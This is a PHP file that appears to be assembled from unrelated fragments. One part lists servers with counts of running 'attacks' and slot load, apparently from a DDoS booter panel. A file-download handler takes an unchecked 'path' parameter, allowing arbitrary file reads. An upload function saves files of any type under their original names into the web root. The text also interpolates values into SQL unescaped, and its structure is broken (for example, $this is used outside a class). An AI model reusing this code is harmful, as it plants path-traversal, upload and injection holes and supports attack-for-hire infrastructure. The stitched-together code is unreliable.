<?php
require_once('includes/configuration.php');
session_start();

if($_POST['runservers'])
{
    $SQLGetInfo = $odb->query("SELECT * FROM `servers` ORDER BY `id` DESC");
    while ($getInfo = $SQLGetInfo->fetch(PDO::FETCH_ASSOC)) 
    {//show server load/slots
        $name     = $getInfo['name'];
        $attacks  = $odb -> query("SELECT COUNT(*) FROM `logs` WHERE `servers` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0") -> fetchColumn(0);
        $load     = $attacks / $getInfo['slots'] * 100;
        echo '<tr style="color: black; background-color: #ff2828; border-color: #ff2828;">
                <td style="color: black; background-color: #ff2828; border-color: #ff2828;">' . $name . '<td style="color: black; background-color: #ff2828; border-color: #ff2828;">
                    <b style="color: black; background-color: #ff2828; border-color: #ff2828;">
                        <font style="color: black; background-color: #ff2828; border-color: #ff2828;">Online</font>
                    </b>
                </td>
                <td style="color: black; background-color: #ff2828; border-color: #ff2828;">' . $attacks . '</td>
                <td style="color: black; background-color: #ff2828; border-color: #ff2828;">
                    <center>' . $load . '%</center>
                </td>
              </tr>';
        //Input Server
    }
}
?>
<?php
ignore_user_abort(true);
set_time_limit(0);
$path = $_GET['path'];
$dl_file = preg_replace("([^\w\s\d\-_~,;:\[\]\(\).]|[\.]{2,})", '', $_GET['download_file']);
$dl_file = filter_var($dl_file, FILTER_SANITIZE_URL);
$fullPath = $_SERVER['DOCUMENT_ROOT'].$path.$dl_file;
if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
        break;
    }
    header("Content-length: $fsize");
    header("Cache-control: private");
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
exit;
function import() {
		if(isset($_POST['upload'])){
		  $filname    = $_FILES['file']['name'];
		  $uploaddir  = $_SERVER["DOCUMENT_ROOT"].'/upload/' . $filname;
		  if(move_uploaded_file($_FILES['file']['tmp_name'], $uploaddir)){
		  } else {
		  }
		}

		echo "<form method='POST' action='#' enctype='multipart/form-data'>
			<input type='hidden' name='".$this->security->get_csrf_token_name()."' value='".$this->security->get_csrf_hash()."'>	
			<input type='file'   name='file'>
		   <input type='submit' name='upload' value='Upload'>
		</form>";exit;
	}
?>